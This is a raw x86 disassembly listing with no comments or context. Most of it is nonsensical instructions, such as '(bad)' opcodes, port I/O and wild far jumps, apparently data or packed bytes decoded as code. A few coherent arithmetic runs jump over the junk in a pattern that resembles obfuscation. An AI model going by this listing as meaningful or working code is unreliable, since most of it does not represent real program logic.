  41350a:	lods   al,BYTE PTR ds:[esi]
  41350b:	pop    eax
  41350c:	cmp    DWORD PTR [eax+0x3e],0x9f71789a
  413513:	repnz imul edi,DWORD PTR [esi+0x64],0x14
  413518:	in     eax,0x72
  41351a:	push   ebp
  41351b:	jne    0x4134bd
  41351d:	ds xchg edx,eax
  41351f:	sub    al,BYTE PTR [edx+ecx*1-0x58b41eb1]
  413526:	repnz pop ds
  413528:	sbb    DWORD PTR [ebx-0x5f],0xffffff96
  41352c:	xlat   BYTE PTR ds:[ebx]
  41352d:	retf   
  41352e:	int    0x4d
  413530:	sbb    DWORD PTR [eax],0xffffff93
  413533:	pushf  
  413534:	aaa    
  413535:	(bad)  
  413536:	leave  
  413537:	loopne 0x413574
  413539:	push   ecx
  41353a:	ins    DWORD PTR es:[edi],dx
  41353b:	xor    cl,dl
  41353d:	dec    edi
  41353e:	or     DWORD PTR [esp+eax*2-0x5a0d5980],edi
  413545:	pop    es
  413546:	int    0x15
  413548:	push   0xfdbe730
  41354d:	fadd   st,st(3)
  41354f:	int    0xe0
  413551:	icebp  
  413552:	idiv   ebx
  413554:	or     DWORD PTR [edi+0x24],eax
  413557:	pop    edx
  413558:	xchg   DWORD PTR [eax],eax
  41355a:	add    al,0x7e
  41355c:	sbb    al,0x8d
  41355e:	mov    ebx,0x6b827f59
  413563:	popf   
  413564:	cmp    ebx,DWORD PTR [esi-0x676dbc44]
  41356a:	outs   dx,BYTE PTR ds:[esi]
  41356b:	push   ecx
  41356c:	xchg   edx,eax
  41356d:	sbb    bh,BYTE PTR [edi+0x1c]
  413570:	jbe    0x413584
  413572:	je     0x41358b
  413574:	adc    al,0xc
  413576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413577:	dec    eax
  413578:	fbstp  TBYTE PTR [ecx+0x3f57f0a0]
  41357e:	xlat   BYTE PTR ds:[ebx]
  41357f:	and    DWORD PTR [ecx],ecx
  413581:	sub    esi,esi
  413583:	loope  0x4135cc
  413585:	aas    
  413586:	xchg   ebx,eax
  413587:	push   ds
  413588:	sar    esp,cl
  41358a:	data16 sti 
  41358c:	push   cs
  41358d:	add    eax,0x8ef75f94
  413592:	les    ebp,FWORD PTR [ebp-0x75]
  413595:	pop    edi
  413596:	sahf   
  413597:	or     al,0xa7
  413599:	xchg   ebx,eax
  41359a:	xor    DWORD PTR [edx],esp
  41359c:	and    al,0x58
  41359e:	aam    0x4c
  4135a0:	jp     0x41357a
  4135a2:	mov    bl,0xbf
  4135a4:	push   0xbdc7b3f9
  4135a9:	mov    esp,0xb4e54a70
  4135ae:	sbb    BYTE PTR [edx-0x7f],ah
  4135b1:	mov    esi,esp
  4135b3:	sub    al,0x51
  4135b5:	cld    
  4135b6:	mov    eax,ds:0xa789ce42
  4135bb:	jo     0x413595
  4135bd:	add    BYTE PTR [esp+edx*2-0x1f],dh
  4135c1:	repz (bad) 
  4135c3:	jmp    0x23f993a0
  4135c8:	imul   ebx,eax,0x59
  4135cb:	sbb    DWORD PTR [ebp-0x7772325d],ecx
  4135d1:	ins    BYTE PTR es:[edi],dx
  4135d2:	sub    DWORD PTR [esi],eax
  4135d4:	push   edx
  4135d5:	ins    DWORD PTR es:[edi],dx
  4135d6:	int3   
  4135d7:	cwde   
  4135d8:	(bad)  
  4135d9:	xchg   esi,eax
  4135da:	and    bl,bh
  4135dc:	icebp  
  4135dd:	fimul  WORD PTR [esp+eiz*2-0x1]
  4135e1:	in     al,dx
  4135e2:	adc    BYTE PTR [esi+edi*2-0x261909a0],bl
  4135e9:	inc    edx
  4135ea:	inc    esp
  4135eb:	sbb    al,BYTE PTR [ebx+eiz*1-0x7e]
  4135ef:	mov    esp,esi
  4135f1:	and    dh,BYTE PTR [eax+0x7d]
  4135f4:	fwait
  4135f5:	mov    bh,0xd0
  4135f7:	push   eax
  4135f8:	fmul   QWORD PTR [eax-0x3bfaf323]
  4135fe:	and    BYTE PTR [esi+0x4959940b],0x21
  413605:	jle    0x413591
  413607:	aaa    
  413608:	dec    ecx
  413609:	pop    esp
  41360a:	in     eax,0x9
  41360c:	jl     0x4135a2
  41360e:	inc    ebp
  41360f:	mov    edi,0x7e0ec5ef
  413614:	int    0xb3
  413616:	aaa    
  413617:	add    DWORD PTR [eax+0x34],esi
  41361a:	std    
  41361b:	enter  0xa93a,0x23
  41361f:	jg     0x41366a
  413621:	or     eax,0x79cee767
  413626:	inc    ebp
  413627:	cld    
  413628:	mov    WORD PTR [edi],?
  41362a:	jbe    0x4135ad
  41362c:	test   BYTE PTR [esi],dl
  41362e:	sbb    esp,DWORD PTR [esi+esi*1]
  413631:	xor    eax,0xfab50932
  413636:	pop    eax
  413637:	inc    edx
  413638:	add    eax,esp
  41363a:	in     eax,0xbb
  41363c:	outs   dx,BYTE PTR ds:[esi]
  41363d:	sub    eax,0xd23a91c
  413642:	mov    cl,0xee
  413644:	ins    DWORD PTR es:[edi],dx
  413645:	popa   
  413646:	mov    ds:0x36f9408d,eax
  41364b:	or     ah,BYTE PTR [ecx+esi*8]
  41364e:	and    ecx,edi
  413650:	pop    edi
  413651:	add    ebp,esi
  413653:	rol    BYTE PTR [ebx-0xf],0x0
  413657:	push   cs
  413658:	dec    esp
  413659:	adc    eax,0xd8c02c00
  41365e:	sbb    DWORD PTR [edi+0xd],ebx
  413661:	mov    cl,0xa7
  413663:	in     eax,dx
  413664:	daa    
  413665:	cmp    edi,ecx
  413667:	outs   dx,DWORD PTR ds:[esi]
  413668:	xor    al,0xb8
  41366a:	mul    edi
  41366c:	cli    
  41366d:	mov    ah,BYTE PTR [ebx+0x39]
  413670:	outs   dx,DWORD PTR ds:[esi]
  413671:	aas    
  413672:	sbb    eax,0x17fe35bd
  413677:	or     cl,0x63
  41367a:	pop    edx
  41367b:	push   0xc4c7d33e
  413680:	push   ds
  413681:	cmp    cl,bh
  413683:	rcr    al,cl
  413685:	int3   
  413686:	inc    edi
  413687:	push   ds
  413688:	add    ecx,DWORD PTR [ebp+0x2ce62cf2]
  41368e:	enter  0x6cdd,0xdd
  413692:	outs   dx,BYTE PTR ds:[esi]
  413693:	xchg   ebp,eax
  413694:	mov    BYTE PTR [esi],dh
  413696:	cmp    DWORD PTR [bx],esi
  413699:	mov    bl,0x78
  41369b:	jp     0x41366c
  41369d:	mov    cl,BYTE PTR [esi-0x7fa21516]
  4136a3:	cmp    edi,esp
  4136a5:	sar    DWORD PTR [ecx-0x740c1ccc],1
  4136ab:	loopne 0x4136a4
  4136ad:	push   ecx
  4136ae:	push   0x569683ab
  4136b3:	fwait
  4136b4:	cdq    
  4136b5:	inc    edx
  4136b6:	xor    DWORD PTR [ecx],ebx
  4136b8:	add    edx,DWORD PTR [eax+0xb78de3a]
  4136be:	push   ecx
  4136bf:	(bad)  
  4136c0:	cmp    eax,0x4110087f
  4136c5:	or     al,bl
  4136c7:	mov    ch,0xac
  4136c9:	xchg   ecx,eax
  4136ca:	int3   
  4136cb:	outs   dx,DWORD PTR ds:[esi]
  4136cc:	fcmove st,st(6)
  4136ce:	std    
  4136cf:	rcl    BYTE PTR [esi+ecx*2+0x3f],0x8b
  4136d4:	push   ebp
  4136d5:	mov    esp,0x33f47d8b
  4136da:	shl    BYTE PTR [ebx],1
  4136dc:	clc    
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x57048de7]
  4136f4:	sar    edi,0x28
  4136f7:	jge    0x413778
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x413701
  4136ff:	aad    0x64
  413701:	sbb    DWORD PTR [edi+0x5e],ebp
  413704:	and    ebx,DWORD PTR [edi+0x71]
  413707:	and    al,BYTE PTR [edx+0x2]
  41370a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41370b:	and    al,0x35
  41370d:	sbb    BYTE PTR [edx+0x50a6831e],dl
  413713:	js     0x413793
  413715:	pop    ebp
  413716:	cmp    bh,ah
  413718:	repnz inc ebx
  41371a:	push   ss
  41371b:	pop    ebx
  41371c:	dec    edx
  41371d:	leave  
  41371e:	std    
  41371f:	or     eax,0x30e66ff
  413724:	xor    DWORD PTR [edi+0x21a1fc4f],eax
  41372a:	mov    cl,0xa5
  41372c:	adc    DWORD PTR [ebx-0x3e8996f0],0xdafd0b55
  413736:	out    dx,al
  413737:	ret    0x1e57
  41373a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41373b:	fdivr  DWORD PTR [edi+ebx*1+0x24]
  41373f:	repnz mov ch,0x99
  413742:	scas   eax,DWORD PTR es:[edi]
  413743:	push   ss
  413744:	push   ebp
  413745:	pop    esi
  413746:	add    bl,BYTE PTR [edi+0x4af9aafe]
  41374c:	adc    esi,esi
  41374e:	in     al,dx
  41374f:	pusha  
  413750:	pop    edi
  413751:	lock shr bl,0xda
  413755:	inc    ebx
  413756:	adc    ah,BYTE PTR [eax+0x65]
  413759:	out    dx,eax
  41375a:	aam    0xc4
  41375c:	jns    0x413789
  41375e:	pop    ds
  41375f:	fwait
  413760:	jmp    0x89c07756
  413765:	push   esi
  413766:	xchg   esp,eax
  413767:	jae    0x4137b5
  413769:	xor    dh,BYTE PTR [esp+esi*8+0x15]
  41376d:	outs   dx,DWORD PTR ds:[esi]
  41376e:	sbb    eax,0xe14b3f3d
  413773:	jp     0x413764
  413775:	cmp    al,0xa1
  413777:	iret   
  413778:	ja     0x41371c
  41377a:	push   edx
  41377b:	cmp    al,0x96
  41377d:	mov    ebp,0xd096dceb
  413782:	or     DWORD PTR cs:[edx],esp
  413785:	mov    bh,0xe9
  413787:	mov    BYTE PTR [ecx+ebp*8],dl
  41378a:	sub    eax,DWORD PTR [ebx]
  41378c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378d:	mov    edi,0xfee4b3dd
  413792:	sub    ebp,DWORD PTR [edi+0x67]
  413795:	sbb    al,0x25
  413797:	fild   WORD PTR [edx-0x42cd0ba6]
  41379d:	into   
  41379e:	fcomp  QWORD PTR [edi+ebp*1+0x59f00617]
  4137a5:	jnp    0x413803
  4137a7:	sbb    BYTE PTR [ebp-0x65],dl
  4137aa:	imul   edx,DWORD PTR [esi],0xfffffff5
  4137ad:	add    eax,0x8ec4ddca
  4137b2:	push   cs
  4137b3:	pop    esi
  4137b4:	jne    0x41373d
  4137b6:	(bad)  
  4137b7:	mov    ebx,0x1e72c62d
  4137bc:	push   ss
  4137bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137be:	jle    0x413785
  4137c0:	out    0x64,al
  4137c2:	xchg   edx,eax
  4137c3:	sub    eax,0xa508bc28
  4137c8:	xchg   ebx,eax
  4137c9:	popa   
  4137ca:	loop   0x4137aa
  4137cc:	sti    
  4137cd:	outs   dx,DWORD PTR ds:[esi]
  4137ce:	enter  0x7b21,0x76
  4137d2:	popa   
  4137d3:	add    eax,DWORD PTR [ebp+0x43]
  4137d6:	pop    edx
  4137d7:	lods   eax,DWORD PTR ds:[esi]
  4137d8:	dec    esp
  4137d9:	jo     0x413773
  4137db:	(bad)  
  4137dd:	mov    al,ds:0x4eb8c855
  4137e2:	ds mov cl,0x2e
  4137e5:	pop    ebp
  4137e6:	mov    BYTE PTR [edi],bh
  4137e8:	loopne 0x41384b
  4137ea:	addr16 mov ebx,0x325fc1c1
  4137f0:	and    eax,0x9a99dfe4
  4137f5:	jns    0x41384c
  4137f7:	or     BYTE PTR [eax],dl
  4137f9:	scas   eax,DWORD PTR es:[edi]
  4137fa:	cs sbb ebx,eax
  4137fd:	jb     0x4137ea
  4137ff:	add    DWORD PTR [edi-0x47],eax
  413802:	cmp    DWORD PTR [edi],ebx
  413804:	in     eax,dx
  413805:	xchg   ecx,ecx
  413807:	(bad)  
  413808:	fcomp  QWORD PTR [ebp+0x5230aa91]
  41380e:	pop    ecx
  41380f:	jmp    0xd0c0:0x827dab27
  413816:	sub    BYTE PTR [edx+eiz*8],bh
  413819:	ret    0xced2
  41381c:	outs   dx,BYTE PTR ds:[esi]
  41381d:	hlt    
  41381e:	stc    
  41381f:	addr16 aas 
  413821:	xchg   edi,eax
  413822:	pop    esp
  413823:	cmc    
  413824:	add    eax,0x9dfd2896
  413829:	lea    ecx,[ebp-0x504255b5]
  41382f:	inc    ebp
  413830:	push   esi
  413831:	lods   al,BYTE PTR ds:[esi]
  413832:	sbb    eax,DWORD PTR [eax-0x70]
  413835:	cmp    dl,BYTE PTR ds:0xa03715e
  41383b:	jge    0x4137e1
  41383d:	out    dx,al
  41383e:	mov    bl,0x99
  413840:	jns    0x41385c
  413842:	mov    BYTE PTR [ebx-0x549af53e],dh
  413848:	clc    
  413849:	and    DWORD PTR ds:0x14ae10e1,edx
  41384f:	hlt    
  413850:	push   edi
  413851:	pop    edi
  413852:	in     eax,dx
  413853:	xchg   esp,eax
  413854:	sti    
  413855:	jno    0x413858
  413857:	cmp    edx,edx
  413859:	jmp    0xeec05778
  41385e:	sub    eax,0x7f88fa4c
  413863:	sub    eax,0xd6af11fe
  413868:	lock in eax,0xbc
  41386b:	aaa    
  41386c:	retf   
  41386d:	jmp    0xc5dc:0x58e74c0a
  413874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413875:	pop    ebp
  413876:	pop    es
  413877:	and    ebp,DWORD PTR [esi]
  413879:	mov    al,ds:0x6ca2f0bd
  41387f:	shl    BYTE PTR [ebx+eax*8+0x7adfbd46],0xc6
  413887:	sub    eax,0xc7fd9bac
  41388c:	bound  edx,QWORD PTR [edi+0x502b122]
  413892:	repnz mov ebx,0xf5b366fb
  413898:	adc    BYTE PTR [ebx+0x3aa3b312],al
  41389e:	or     eax,DWORD PTR [esi]
  4138a0:	mov    bl,0xe2
  4138a2:	sub    DWORD PTR [esi],0x8d39ccfa
  4138a8:	test   eax,0x6c55b01b
  4138ad:	outs   dx,BYTE PTR ds:[esi]
  4138ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138af:	xchg   ebp,eax
  4138b0:	ret    0xb37a
  4138b3:	js     0x413843
  4138b5:	push   ecx
  4138b6:	sar    DWORD PTR [edx+eax*4],1
  4138b9:	push   ebp
  4138ba:	call   0x2f53:0x648dddc7
  4138c1:	imul   ecx,DWORD PTR ds:0x16f07c04,0x6f
  4138c8:	out    0xe2,al
  4138ca:	pop    eax
  4138cb:	clc    
  4138cc:	pop    esp
  4138cd:	xor    esi,DWORD PTR [edi+0x79]
  4138d0:	push   0x7d
  4138d2:	mov    esi,0xbe4ca95b
  4138d7:	sti    
  4138d8:	and    eax,0xab927722
  4138dd:	xlat   BYTE PTR ds:[ebx]
  4138de:	bound  ebx,QWORD PTR [eax+0x4364e363]
  4138e4:	aaa    
  4138e5:	mov    esp,0x6ecc90c3
  4138ea:	daa    
  4138eb:	jns    0x4138d6
  4138ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ee:	outs   dx,DWORD PTR ds:[esi]
  4138ef:	aas    
  4138f0:	stc    
  4138f1:	ficomp DWORD PTR [eax+0xcedd77c]
  4138f7:	adc    bl,dl
  4138f9:	int3   
  4138fa:	sub    DWORD PTR [ebp+0x2b],esi
  4138fd:	xchg   edx,eax
  4138fe:	inc    esi
  4138ff:	jle    0x4138b2
  413901:	mov    dh,0x26
  413903:	icebp  
  413904:	jbe    0x4138c2
  413906:	ret    
  413907:	gs retf 
  413909:	adc    eax,0x6d338443
  41390e:	mov    esp,0x20ac4568
  413913:	fisttp WORD PTR [ebx-0x5a]
  413916:	jnp    0x4138c6
  413918:	(bad)  
  413919:	pop    ebx
  41391a:	stc    
  41391b:	mov    dl,0x62
  41391d:	inc    edi
  41391e:	cmp    edi,ecx
  413920:	pushf  
  413921:	test   eax,edx
  413923:	dec    edx
  413924:	pop    ebx
  413925:	std    
  413926:	data16 add BYTE PTR fs:0x77fe4b65,ch
  41392e:	lea    eax,[ebx]
  413930:	jg     0x4139a1
  413932:	mov    al,ds:0xd5f7dab3
  413937:	xor    al,0x7b
  413939:	sub    eax,0x647b750
  41393e:	je     0x4138e3
  413940:	sahf   
  413941:	shr    BYTE PTR [esi+edi*2],1
  413944:	gs int 0x8a
  413947:	ret    
  413948:	pop    ebp
  413949:	das    
  41394a:	or     al,0x76
  41394c:	aaa    
  41394d:	outs   dx,BYTE PTR ds:[esi]
  41394e:	push   ecx
  41394f:	in     al,dx
  413950:	ja     0x4138e3
  413952:	mul    DWORD PTR [ebp+0x459b4794]
  413958:	push   0x29
  41395a:	xchg   esp,eax
  41395b:	or     dh,BYTE PTR [ebx]
  41395d:	inc    DWORD PTR [eax]
  41395f:	call   0xde92cefc
  413964:	pop    ds
  413965:	rcl    BYTE PTR gs:[ebx-0x5b],0xf
  41396a:	scas   eax,DWORD PTR es:[edi]
  41396b:	xlat   BYTE PTR ds:[ebx]
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x4139b7
  413996:	je     0x413990
  413998:	or     DWORD PTR [ebp-0x1a8780fd],edx
  41399e:	jle    0x413a18
  4139a0:	js     0x41392f
  4139a2:	ss xchg ecx,eax
  4139a4:	(bad)  
  4139a5:	nop
  4139a6:	or     DWORD PTR [edi],ebx
  4139a8:	mov    ds:0x5c22bf88,al
  4139ad:	cli    
  4139ae:	fnstenv [ebx-0x74d8ca5]
  4139b4:	pop    eax
  4139b5:	stc    
  4139b6:	clts   
  4139b8:	fnstcw WORD PTR [eax]
  4139ba:	adc    esi,0x40
  4139bd:	pop    ds
  4139be:	push   ecx
  4139bf:	push   ebx
  4139c0:	jmp    0x6a0f:0xe43dcc76
  4139c7:	mov    cl,0x1b
  4139c9:	dec    eax
  4139ca:	mov    ch,0x2e
  4139cc:	imul   edi,DWORD PTR [ecx],0xffffffee
  4139cf:	or     eax,0x29b83bc0
  4139d4:	cs mov bl,0x7b
  4139d7:	(bad)  
  4139d9:	and    eax,0xdd6f2bb0
  4139de:	sahf   
  4139df:	je     0x413a1b
  4139e1:	test   dl,cl
  4139e3:	in     eax,dx
  4139e4:	pusha  
  4139e5:	add    esp,DWORD PTR [esi-0x74]
  4139e8:	mov    ch,0x80
  4139ea:	jmp    0x413a61
  4139ec:	push   esi
  4139ed:	lea    esi,[edx+0x74]
  4139f0:	jnp    0x4139eb
  4139f2:	sub    BYTE PTR [ecx],bh
  4139f4:	fdiv   st,st(7)
  4139f6:	xchg   BYTE PTR [eax+0x36],ah
  4139f9:	mov    bh,0xb7
  4139fb:	xchg   BYTE PTR [ebx],ch
  4139fd:	leave  
  4139fe:	mov    es,WORD PTR [ebx]
  413a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a01:	daa    
  413a02:	pop    eax
  413a03:	fs enter 0xb719,0xbd
  413a08:	shl    ecx,0x3f
  413a0b:	add    al,0xd
  413a0d:	mov    ebp,0x1afc12a4
  413a12:	fmul   DWORD PTR [ecx+0xd]
  413a15:	lods   eax,DWORD PTR ds:[esi]
  413a16:	fisubr DWORD PTR [esi]
  413a18:	push   esp
  413a19:	mov    DWORD PTR [eax-0x33f5bc16],eax
  413a1f:	int    0x22
  413a21:	cmp    al,0x2d
  413a23:	repz hlt 
  413a25:	adc    eax,DWORD PTR [esi+0x653524bf]
  413a2b:	call   0xa38886f9
  413a30:	sbb    cl,BYTE PTR [esi+0x8fc8a39]
  413a36:	mov    dl,0x19
  413a38:	xchg   BYTE PTR [edi],bl
  413a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a3b:	lds    esp,FWORD PTR [edx-0x1a]
  413a3e:	mov    cl,0x7a
  413a40:	jmp    0x60fe:0x8d3eb424
  413a47:	stc    
  413a48:	xor    BYTE PTR [ebp-0x56b399e6],ch
  413a4e:	test   al,0x7b
  413a50:	jmp    0x92a9:0x2c5cde7d
  413a57:	inc    esi
  413a58:	cmc    
  413a59:	add    DWORD PTR [ebx+0x3780393b],0xcbd57a0c
  413a63:	jne    0x413a42
  413a65:	in     al,0x7e
  413a67:	call   0x649ebe9
  413a6c:	sub    BYTE PTR [ebp-0x139b5fa2],cl
  413a72:	in     eax,dx
  413a73:	dec    esp
  413a74:	mov    edx,0x96428618
  413a79:	mov    al,cs:0x8fa1b0c
  413a7f:	icebp  
  413a80:	xlat   BYTE PTR ds:[ebx]
  413a81:	mov    esp,0x1fdc6479
  413a86:	ret    0x7e37
  413a89:	mov    al,ds:0xd63c41d4
  413a8e:	shl    edi,cl
  413a90:	mov    ?,eax
  413a92:	imul   eax,DWORD PTR [edx+0x5c],0x86ecd314
  413a99:	add    esp,DWORD PTR [esp+eax*8-0x38]
  413a9d:	(bad)  
  413a9e:	and    cl,BYTE PTR [edi+0x4a55eb88]
  413aa4:	sbb    BYTE PTR [ebx],al
  413aa6:	imul   esp,esp,0xb3ea3f6f
  413aac:	or     DWORD PTR [eax+ebp*8],edx
  413aaf:	add    cl,BYTE PTR [ebp+0x73]
  413ab2:	xor    DWORD PTR [edx],ebx
  413ab4:	jge    0x413abe
  413ab6:	call   0xc417fb81
  413abb:	lahf   
  413abc:	leave  
  413abd:	mov    cl,0xd0
  413abf:	xchg   edx,eax
  413ac0:	rol    BYTE PTR [ebx+0x10dedd4b],cl
  413ac6:	bound  eax,QWORD PTR [esi]
  413ac8:	xchg   ebp,eax
  413ac9:	stos   BYTE PTR es:[edi],al
  413aca:	inc    cx
  413acc:	cmc    
  413acd:	lock pop ss
  413acf:	jae    0x413b28
  413ad1:	clc    
  413ad2:	mov    eax,ds:0x83a3c562
  413ad7:	cwde   
  413ad8:	scas   al,BYTE PTR es:[edi]
  413ad9:	mov    esi,0xd694cffc
  413ade:	add    eax,0xfdc120ca
  413ae3:	lds    edx,FWORD PTR ds:[ecx+0x62]
  413ae7:	and    ebx,DWORD PTR [ebx]
  413ae9:	mov    eax,0xf1bbbcd
  413aee:	jmp    0x413b59
  413af0:	adc    DWORD PTR ds:0x37bcc1ee,eax
  413af6:	and    dl,bl
  413af8:	aam    0x6f
  413afa:	sub    ch,BYTE PTR [esi-0x77]
  413afd:	mov    al,dl
  413aff:	pop    ecx
  413b00:	push   es
  413b01:	repz push eax
  413b03:	lods   eax,DWORD PTR ds:[esi]
  413b04:	adc    al,0x54
  413b06:	rcr    DWORD PTR [ebx-0x64],1
  413b09:	xlat   BYTE PTR ds:[ebx]
  413b0a:	test   DWORD PTR [esi-0x44],ebx
  413b0d:	lahf   
  413b0e:	mov    ebx,0x30f693a9
  413b13:	jbe    0x413b26
  413b15:	and    DWORD PTR [eax-0x32],esi
  413b18:	daa    
  413b19:	mov    cl,0xa
  413b1b:	mov    ebp,0x122e30c4
  413b20:	sub    DWORD PTR [edx],0xffffffc1
  413b23:	call   0xe6bf0e0c
  413b28:	xchg   esi,eax
  413b29:	lods   eax,DWORD PTR ds:[esi]
  413b2a:	xchg   ebp,eax
  413b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b2c:	les    eax,FWORD PTR [edx]
  413b2e:	cmp    ah,BYTE PTR [edi-0x29]
  413b31:	jbe    0x413ae1
  413b33:	push   ebp
  413b34:	push   edx
  413b35:	aam    0xaf
  413b37:	dec    ecx
  413b38:	jnp    0x413b0d
  413b3a:	and    bh,BYTE PTR [ecx+0x49a6b54b]
  413b40:	imul   esp,esi,0x800d602f
  413b46:	sahf   
  413b47:	adc    BYTE PTR ds:0x2f1374d8,bh
  413b4d:	out    0x4b,al
  413b4f:	sar    BYTE PTR [edi-0x54],cl
  413b52:	sub    al,0xaa
  413b54:	cwde   
  413b55:	sub    BYTE PTR [ebp+0x4c],bl
  413b58:	and    ebx,DWORD PTR [edx-0x5a]
  413b5b:	add    eax,DWORD PTR [esi-0xbfd65b5]
  413b61:	lea    ecx,[esi]
  413b63:	pop    esp
  413b64:	lds    ecx,FWORD PTR [edi-0xad49240]
  413b6a:	and    ecx,0x4b
  413b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b6e:	daa    
  413b6f:	cmp    al,0x7e
  413b71:	mov    cl,BYTE PTR [ebx+0x1d]
  413b74:	or     bl,BYTE PTR [esi+0x42]
  413b77:	jne    0x413be0
  413b79:	stos   DWORD PTR es:[edi],eax
  413b7a:	mov    al,0xc1
  413b7c:	jne    0x413bcd
  413b7e:	(bad)  
  413b7f:	test   BYTE PTR [edi-0x64],0x28
  413b83:	pop    esi
  413b84:	lea    ecx,[edi+0x69]
  413b87:	jecxz  0x413b72
  413b89:	aaa    
  413b8a:	fist   WORD PTR [edx]
  413b8c:	add    al,0xfb
  413b8e:	or     eax,0x84b0fd6a
  413b93:	adc    al,0x13
  413b95:	sub    bl,ch
  413b97:	ss jmp 0x3f28:0xdaf946c
  413b9f:	arpl   WORD PTR [edi-0x2a],bp
  413ba2:	adc    dl,BYTE PTR [ebx+0x77]
  413ba5:	stos   BYTE PTR es:[edi],al
  413ba6:	stos   BYTE PTR es:[edi],al
  413ba7:	mov    eax,DWORD PTR [ebp-0x22]
  413baa:	rcl    eax,cl
  413bac:	mov    ecx,0x924a2ec6
  413bb1:	aas    
  413bb2:	fwait
  413bb3:	jp     0x413b54
  413bb5:	enter  0x5e7c,0xbd
  413bb9:	hlt    
  413bba:	out    dx,eax
  413bbb:	jb     0x413baa
  413bbd:	aaa    
  413bbe:	cmp    al,0xea
  413bc1:	dec    ebp
  413bc2:	mov    ebx,0xb642b1f1
  413bc7:	xchg   ebx,eax
  413bc8:	push   edx
  413bc9:	pop    ecx
  413bca:	mov    al,0xce
  413bcc:	xchg   edx,eax
  413bcd:	loop   0x413ba8
  413bcf:	inc    ebx
  413bd0:	jmp    0x10e2:0xa64efd62
  413bd7:	dec    ebp
  413bd8:	leave  
  413bd9:	mov    ah,0xb5
  413bdb:	push   ds
  413bdc:	lock aad 0x29
  413bdf:	and    dh,bh
  413be1:	out    0x7a,al
  413be3:	sub    al,0x5e
  413be5:	aaa    
  413be6:	jge    0x413be0
  413be8:	add    ch,BYTE PTR [eax]
  413bea:	out    dx,al
  413beb:	xor    ah,BYTE PTR [eax-0x64605456]
  413bf1:	sub    eax,0xee587ade
  413bf6:	adc    ecx,DWORD PTR [ebp+0x3d03cb05]
  413bfc:	xchg   esp,eax
  413bfd:	(bad)  
  413bfe:	pop    edx
  413bff:	sbb    BYTE PTR [ebp+0x4d],ah
  413c02:	pushf  
  413c03:	leave  
  413c04:	mov    dl,0x82
  413c06:	add    eax,0x6f36b6fa
  413c0b:	push   es
  413c0c:	sub    edx,edi
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	add    BYTE PTR [ecx+0x32],bl
  413c2c:	fiadd  WORD PTR [edx]
  413c2e:	add    BYTE PTR [edi+0x78],bh
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	push   eax
  413c36:	mov    ?,WORD PTR [esi+0x6c]
  413c39:	dec    edx
  413c3a:	xchg   ebx,eax
  413c3b:	call   0xebf6:0xf491ad7d
  413c42:	scas   eax,DWORD PTR es:[edi]
  413c43:	popf   
  413c44:	aam    0x45
  413c46:	dec    eax
  413c47:	and    dh,BYTE PTR [eax+esi*8-0x18]
  413c4b:	mov    esi,0x1653b894
  413c50:	lods   eax,DWORD PTR ds:[esi]
  413c51:	jne    0x413c41
  413c53:	mov    al,ds:0xdc89cd00
  413c58:	dec    ecx
  413c59:	shl    DWORD PTR [eax+0x8df3de8],cl
  413c5f:	aaa    
  413c60:	xchg   ecx,eax
  413c61:	ds push cs
  413c63:	ss xchg ebp,eax
  413c65:	sub    al,0x15
  413c67:	jnp    0x413c66
  413c69:	adc    al,0x7c
  413c6b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  413c6d:	push   esi
  413c6e:	fistp  WORD PTR [ebx-0x18]
  413c71:	cs push ds
  413c73:	ss jo  0x413c8e
  413c76:	fcmove st,st(0)
  413c78:	out    dx,al
  413c79:	fdivr  DWORD PTR [eax-0x59699bb0]
  413c7f:	je     0x413c5b
  413c81:	xor    bh,BYTE PTR [edi]
  413c83:	or     al,0x31
  413c85:	xchg   esi,eax
  413c86:	sahf   
  413c87:	mov    ah,0x16
  413c89:	mov    ebp,0xcafdf82b
  413c8e:	fld    QWORD PTR [eax]
  413c90:	(bad)  
  413c91:	in     eax,dx
  413c92:	cmp    al,0x85
  413c94:	jp     0x413c51
  413c96:	mov    dl,0x64
  413c98:	xchg   edx,eax
  413c99:	add    DWORD PTR [esp+ebx*4-0x2a],0x27c6dffd
  413ca1:	mov    cl,0xa0
  413ca3:	js     0x413c73
  413ca5:	or     DWORD PTR [edi+0x2],edi
  413ca8:	pop    ebx
  413ca9:	mov    bl,0x7e
  413cab:	mov    edx,0x5d0055dd
  413cb0:	inc    ebx
